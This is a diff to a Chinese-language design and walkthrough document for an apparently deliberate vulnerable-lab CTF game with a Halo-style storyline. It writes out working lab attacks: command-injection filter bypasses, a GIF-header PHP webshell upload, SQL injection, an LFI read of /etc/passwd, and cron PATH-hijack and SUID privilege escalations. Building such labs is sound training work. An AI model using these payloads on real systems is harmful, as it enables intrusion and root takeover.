@@ -77,13 +77,21 @@ curl "http://TARGET:8080/?page=search&q=Farrow"
 
 `?q=` 本身有 **reflected XSS**（`Results for: <query>` 沒做 escaping），可用來練習/示範，但不是主線必經之路。
 
-### 2.3 三選一拿初始立足點（www-data）
-- **Command Injection**：`?page=ping`，POST `host=127.0.0.1; id`
+### 2.3 三選一拿初始立足點（www-data）— 三條路現在有不同 tradeoff
+
+- **Command Injection（容易找到，利用較麻煩）**：`?page=ping`。todo.txt 提到的「上次事故後修過」只堵了 `;`（`str_replace(';', '', $host)`），換行符、backtick、`$()` 都沒擋：
   ```bash
-  curl -X POST "http://TARGET:8080/?page=ping" --data "host=127.0.0.1; id"
+  curl -X POST "http://TARGET:8080/?page=ping" --data $'host=127.0.0.1\nid'
+  # 或
+  curl -X POST "http://TARGET:8080/?page=ping" --data 'host=$(id)'
   ```
-- **Unrestricted Upload**：`?page=upload`，上傳 `.php` webshell 到 `/var/www/html/portal/uploads/`（無型別檢查、無 rename）。
-- **LFI / Path Traversal**：`?page=notes&file=../../../../etc/passwd` 可讀任意檔案，但拿不到 shell，只能讀檔。
+- **Unrestricted Upload（較難 enumerate，exploit 乾淨）**：`?page=upload` 現在會用 `getimagesize()` 擋掉非圖片檔（todo.txt 標成 SEC-1188 已修），但沒有 extension allowlist、沒有 rename，`.php` 副檔名照樣被 php-fpm 執行。`getimagesize()` 只檢查檔頭結構，不驗證檔案其餘內容 —— 在合法 GIF 檔頭（`GIF89a` + 最小 logical screen descriptor）後面直接接 PHP payload 即可過檢查，且必須手動拼 multipart body（Burp Repeater 或 curl `--data-binary`），不能只是在檔案選擇對話框挑一個 `.php`：
+  ```bash
+  printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00<?php system($_GET["c"]); ?>' > shell.php
+  curl -F "file=@shell.php;type=image/gif" "http://TARGET:8080/?page=upload"
+  curl "http://TARGET:8080/uploads/shell.php?c=id"
+  ```
+- **LFI / Path Traversal（只有 information disclosure，需要 chain 才能拿 shell）**：`?page=notes&file=../../../../etc/passwd` 可讀任意檔案，但拿不到 shell，只能讀檔。
 
 ### 2.4 Support Tickets — 建立懷疑 + 找到合法密碼來源
 ```bash
@@ -99,7 +107,7 @@ curl "http://TARGET:8080/?page=notes&file=credential_rotation_status.txt"
 ```
 `/notes/` 目錄實際列出 **6 個檔案**，多出來的 3 個（`parking_permit_renewal.txt`、`elevator_status.txt`、`supply_closet_note.txt`）是純填充內容，跟劇情/漏洞無關——刻意讓這個 autoindex 看起來像真的辦公室共用資料夾裡會有的雜物，不是「一列出來就知道哪個檔案是重點」。
 
-`credential_rotation_status.txt` 這份文件是整條 credential-reuse 鏈的**唯一合法起點**：T.R. 在工單裡不小心貼上了一段舊的 provisioning script（`useradd`/`chpasswd`），內容就是 `sysadmin/admin123`、`devuser/devuser2024`、`backup/backup`、`deploy/deploy!` 四組帳密，並註明從未經過 first-login 輪替。頁面上如果順手看一下 `?page=notes&file=welcome.txt` 旁邊列的其他人員，會看到 T. Reyes 的頭像（`t_reyes.jpg`，真實照片素材）掛在留言旁邊——純粹增加真實感，不帶任何線索。
+`credential_rotation_status.txt` 這份文件現在只回報「terminal/webmail 人員帳號」的輪替狀態，不再一次性倒出四組帳密：`devuser` 已在去年稽核後完成 first-login 輪替（死線索）、`deploy` 已隨舊系統一併停用（死線索），只有 `sysadmin` 還卡在 Security 簽核，因此文件裡才會附上它目前仍是 provisioning 預設密碼 `admin123`。這份文件明確寫「機器/服務帳號由 Ops 另外追蹤」——`backup` 帳號完全不在這份清單裡，它的密碼只能靠 3.3 節 relay 的 `service_accounts` 資料表另外找到，兩條發現管道刻意分開，不是同一份文件重複重用。頁面上如果順手看一下 `?page=notes&file=welcome.txt` 旁邊列的其他人員，會看到 T. Reyes 的頭像（`t_reyes.jpg`，真實照片素材）掛在留言旁邊——純粹增加真實感，不帶任何線索。
 
 ### 2.5 Webmail（8025）— 憑證重用的起點
 ```bash
@@ -200,16 +208,16 @@ sync_pass = Records!Access99
 
 ### 3.5（附）RELAY 本機提權（非主線必經，但完整記錄）
 ```bash
-sudo -l          # (ALL) NOPASSWD: /usr/bin/socat  -> sudo socat exec:'sh -i',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:1  或直接 sudo -u root socat ...
 /usr/local/bin/python3-suid -c 'import os; os.setuid(0); os.system("/bin/bash")'   # SUID python3
 ```
+（`sudo -l` 上的 `NOPASSWD: /usr/bin/socat` 已移除——socat 留著是給玩家自己拿來做 pivoting/tunneling 用，不再是免密碼 root 捷徑。這台的本機提權現在只剩 SUID python3 這一條，仍然是刻意保留的簡單 optional 分支，非主線必經。）
 
 ---
 
 ## 4. ACT III — ARCHIVE（internal: 10.10.0.15 / cairn.internal，無任何 host port）
 
 ### 設計意圖
-真相的核心層。SPARTAN-II 名稱、flash-clone、augmentation、Halsey 書信片段都在這裡。玩家必須自己從好幾份不同來源拼出全貌，沒有單一「THE_TRUTH.txt」。
+真相的核心層。SPARTAN-II 名稱、flash-clone、augmentation、Halsey 書信片段都在這裡——這是一個重大世界觀 reveal，**但不是遊戲的最終答案**。玩家必須自己從好幾份不同來源拼出全貌，沒有單一「THE_TRUTH.txt」，而且拼出 SPARTAN-II 之後應該立刻意識到：這仍然沒有回答 LONGSHORE 開場真正問的問題——誰在 2547 年重新碰過 Farrow 的案件、為什麼。
 
 ### 4.1 Pivot 進入（從 relay 內部）
 archive 沒有映射任何 port 到宿主機，只能：
@@ -246,14 +254,21 @@ smbclient //cairn.internal/backups -U sysadmin%admin123 -m NT1 \
 - `training_roster_fragment.txt` — **只給訓練代號 + 殖民地 + 年齡，不給姓名**，見 4.4 節。
 - `old_budget_q3_2546.txt` — 純填充，一份過季的預算摘要，跟劇情完全無關，放著只是因為「備份資料夾裡通常什麼都有」。
 
-### 4.3 SQLi 進 CAIRN Records Terminal（8080）
+### 4.3 SQLi 進 CAIRN Records Terminal（8080）— 要抓包才會發現該換欄位
+
+直接把經典 payload 貼在 `username` 欄位已經不再有效：
 ```bash
 curl -i -X POST http://cairn.internal:8080/login --data "username=administrator' -- &password=x"
+# 這次不會 302 -> /dashboard 了
+```
+原因：這台之前收過一份 pentest finding（SEC-2211），修法是把 `username` 欄位的單引號跟 `--` 直接 strip 掉——`admin_panel.py` 裡 `username = username.replace("'", "").replace("--", "")`。這個修法只針對 finding 報告裡點名的欄位，同一條 f-string 組出來的查詢在 `password` 欄位完全沒有動過。玩家需要實際用 Burp Repeater（或手動改 curl）測試把 injection 換到 `password` 欄位，才會發現同一個弱點還在：
+```bash
+curl -i -X POST http://cairn.internal:8080/login --data "username=administrator&password=x' OR '1'='1"
 # 302 -> /dashboard
 ```
-（原理：`SELECT * FROM admins WHERE username='administrator' -- ' AND password='x'`，`--` 把密碼檢查註解掉。）
+（原理：`SELECT * FROM admins WHERE username='administrator' AND password='x' OR '1'='1'`，`AND` 比 `OR` 先算，右邊的 `'1'='1'` 恆真，整個 WHERE 恆真，回傳第一筆。）
 
-也可以不用 SQLi，直接用 3.3 節洩漏的 `administrator / Records!Access99` 正常登入——**兩條路都通**，SQLi 不是唯一解。
+也可以不用 SQLi，直接用 3.3 節洩漏的 `administrator / Records!Access99` 正常登入——**兩條路都通**，SQLi 不是唯一解，兩者互不影響。
 
 ```bash
 curl http://cairn.internal:8080/dashboard
@@ -305,19 +320,40 @@ CAIRN record 106（Cryogenic Recovery Transfer Authorization - Subject 07-B）�
 
 **遊戲永遠不裁決哪個是真的，任何文件都不會給答案。** 這是刻意設計成「多份可信來源互相矛盾」的節點，玩家自己決定要信哪一個，或者接受它本來就沒有乾淨答案。
 
-### 4.6 本機提權（writable cron，root）
+### 4.6 本機提權（PATH hijack via cron，root）— 需要幾步 enumeration，不是單一 misconfig
+
 ```bash
-ls -la /opt/healthcheck.sh        # -rwxrwxrwx root root
-echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /opt/healthcheck.sh
-# 等 root 的 crontab（* * * * *）在 60 秒內跑一次
+cat /etc/crontab
+# PATH=/opt/staging:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+# * * * * * root /opt/healthcheck.sh
+
+ls -la /opt/healthcheck.sh        # -rwxr-x--- root deploy  (讀得到,寫不到)
+cat /opt/healthcheck.sh
+# #!/bin/bash
+# logtool "Health check: $(date)" >> /var/log/health.log
+
+id sysadmin                       # sysadmin 是 deploy 群組成員
+ls -la /opt/staging               # drwxrwxr-x root deploy  <- deploy 群組可寫
+```
+
+推理鏈：cron 用 root 執行 `/opt/healthcheck.sh` → 腳本本身讀得到但寫不到（root:deploy 750）→ 腳本內部呼叫的 `logtool` 沒有寫絕對路徑 → root 的 crontab 把 `/opt/staging` 排在系統目錄**前面** → `sysadmin` 剛好是 `deploy` 群組成員，而 `/opt/staging` 對這個群組可寫 → 在 `/opt/staging` 放一個叫 `logtool` 的檔案，等 root cron 在 60 秒內以 root 身份執行它：
+```bash
+cat > /opt/staging/logtool << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod u+s /tmp/rootbash
+EOF
+chmod +x /opt/staging/logtool
+# 等一分鐘
 /tmp/rootbash -p
 ```
+（`logtool` 這個名字在系統上任何標準 PATH 目錄都不存在——這個 healthcheck job 從部署以來其實一直在默默失敗，不是刻意留的提示字串，是舊 rollout 沒清乾淨的殘留。）
 
 ### 4.7 最終證據（root only）
 ```bash
 cat /root/cairn_disposition_review.txt
 ```
-檔名刻意取成跟其他 CAIRN 文件一致的風格（不叫 `final_*`）。**內容不重講整個陰謀**——acquisition、flash-clone、augmentation 結果玩家此時應該已經自己拼出來了。這份文件只回答一個之前沒人回答過的問題：**Petrov 當初為什麼決定保留這批資料而不銷毀**，以及他自己承認「沒有機制可以決定要不要公開」。是最後一塊拼圖，不是一張把全部劇情倒出來的答案卷。
+檔名刻意取成跟其他 CAIRN 文件一致的風格（不叫 `final_*`）。**內容不重講整個陰謀**——acquisition、flash-clone、augmentation 結果玩家此時應該已經自己拼出來了，SPARTAN-II 這個名稱在 4.3 節就已經正式揭露。這份文件回答的是 LONGSHORE 真正委託的具體問題：SPINDLE 除役檔案檢查把 Farrow（07-B）的低溫懸置單位列入審查清單時，Petrov 在正式審查觸發前私自把保管狀態改成「繼續、無需處理」，未經授權跳過審查——這就是「30 年前的死亡紀錄為什麼在 2547 年被重新處理過」的答案，也是玩家從 Act I 就在追的 transfer_ref 異常真正成因。文件依然**不解答**07-B 是否存活，三方矛盾（casualty log／Kade／低溫轉移授權）永遠沒有標準答案。是最後一塊拼圖，不是一張把全部劇情倒出來的答案卷。
 
 ---
 
@@ -325,9 +361,9 @@ cat /root/cairn_disposition_review.txt
 
 | Host | 立足點 | 提權 |
 |---|---|---|
-| frontier | command injection / upload / LFI（www-data） | `sudo -l` → `(ALL) NOPASSWD: /usr/bin/find` → `sudo find . -exec /bin/sh \;`；或等 `/opt/backup.sh`（world-writable, root cron `*/5`）被執行 |
-| relay | SSH 密碼重用（sysadmin） | SUID `/usr/local/bin/python3-suid`；或 `sudo -l` → `(ALL) NOPASSWD: /usr/bin/socat` |
-| archive | SQLi / SMB（無需 shell 也能拿到大部分文件） | world-writable `/opt/healthcheck.sh`，root cron `* * * * *` |
+| frontier | command injection（過濾 `;` 但漏其他分隔符）/ upload（getimagesize magic-byte bypass）/ LFI（www-data） | `sudo -l` → `(ALL) NOPASSWD: /usr/bin/find` → `sudo find . -exec /bin/sh \;`；或等 `/opt/backup.sh`（world-writable, root cron `*/5`）被執行 —— 這兩條是刻意保留的簡單 optional 分支，非主線必經 |
+| relay | SSH 密碼重用（sysadmin） | SUID `/usr/local/bin/python3-suid`（唯一分支，`sudo socat` NOPASSWD 已移除） —— 同樣是 optional 分支，非主線必經 |
+| archive | SQLi（要換到 password 欄位才有效）/ 合法帳密 / SMB（無需 shell 也能拿到大部分文件） | PATH hijack：cron 用 root 執行 `/opt/healthcheck.sh`（讀得到寫不到），腳本呼叫未寫絕對路徑的 `logtool`，root crontab 的 `PATH=` 把 `/opt/staging` 排在前面且對 `deploy` 群組（`sysadmin` 是成員）可寫 —— **這是主線最終提權，需要多步 enumeration，不是單一 GTFOBins/world-writable 捷徑** |
 
 ## 附錄 B：每一組密碼的「合法發現管道」（不需要 brute force）
 
@@ -342,4 +378,4 @@ cat /root/cairn_disposition_review.txt
 
 ## 附錄 C：完整時間軸 / 真相
 
-遊戲現在時間點：**2555 年**。見 `timeline.md`、`truth-map.md`。簡述：2517 年 ONI Section III 因殖民地叛亂風險發起 SPARTAN-II 計畫（候選人徵召時約 6 歲）→ 用 flash-clone 掩蓋兒童失蹤 → Reach 訓練 + 2525 年 augmentation（死傷不一，Farrow 的結局有三份互相矛盾的來源，永遠不解答）→ 2552 年星盟戰爭結束後這批人成為公開英雄，起源持續保密 → 2547 年舊系統 SPINDLE 退役，資料分流進 LEDGER（一般）與待轉移的 CAIRN staging mirror（機密），正式授權「保留但不公開」→ LONGSHORE（Naomi Okafor）在這次 migration 中意外發現異常，花約 8 年查證後於 2555 年聯絡玩家。
+遊戲現在時間點：**2555 年**。見 `timeline.md`、`truth-map.md`。簡述：2517 年 ONI Section III 因殖民地叛亂風險發起 SPARTAN-II 計畫（候選人徵召時約 6 歲）→ 用 flash-clone 掩蓋兒童失蹤 → Reach 訓練 + 2525 年 augmentation（死傷不一，Farrow 的結局有三份互相矛盾的來源，永遠不解答）→ 2552 年星盟戰爭結束後這批人成為公開英雄，起源持續保密 → 2547 年舊系統 SPINDLE 退役，資料分流進 LEDGER（一般）與待轉移的 CAIRN staging mirror（機密），Petrov 正式授權整批資料「保留但不公開」，**同一時間他私自把 Farrow/07-B 的低溫懸置單位保管狀態改成「繼續、無需處理」，未經授權跳過了本該觸發的正式審查——這是遊戲真正的終局答案，不是 SPARTAN-II 本身** → LONGSHORE（Naomi Okafor）恰好在同一批 migration 中處理鄰近案件時意外發現 Eli 的異常，又找到一份顯示 Farrow 案在結案數十年後被重新處理過的 index 殘存片段，花約 8 年查證後於 2555 年聯絡玩家，要求玩家查出「誰動了 Farrow 的檔案、為什麼」。
